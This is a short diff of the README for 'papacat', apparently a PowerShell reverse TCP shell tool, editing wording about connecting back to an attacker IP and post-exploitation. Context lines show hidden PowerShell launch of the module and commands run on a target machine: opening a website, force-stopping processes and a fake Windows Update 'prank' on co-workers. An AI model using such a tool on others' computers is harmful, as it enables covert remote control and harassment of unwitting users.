@@ -68,7 +68,7 @@
 <br />
 
 # papacat Manual Execution
-Papacat project builds reverse tcp shells that connects to target ip adress through tcp protocol
+Papacat project connects to attacker ip adress [ -c ] through tcp protocol
 
 <br />
 
@@ -110,7 +110,7 @@ Start-Process -WindowStyle Hidden powershell -ArgumentList "Import-Module .\papa
 
 <br />
 
-# papacat post-exploitation
+# papacat at post-exploitation
 
 #### Send one message to target machine
 ```powershell
@@ -125,6 +125,8 @@ Start https://youporn.com
 # Stop process name (notepad)
 Stop-Process -Name "notepad.exe" -Force
 ```
+
+<br />
 
 #### Windows Update Prank ( prank your co-workers -- press F11 on target keyboard to exit prank )
 ```powershell
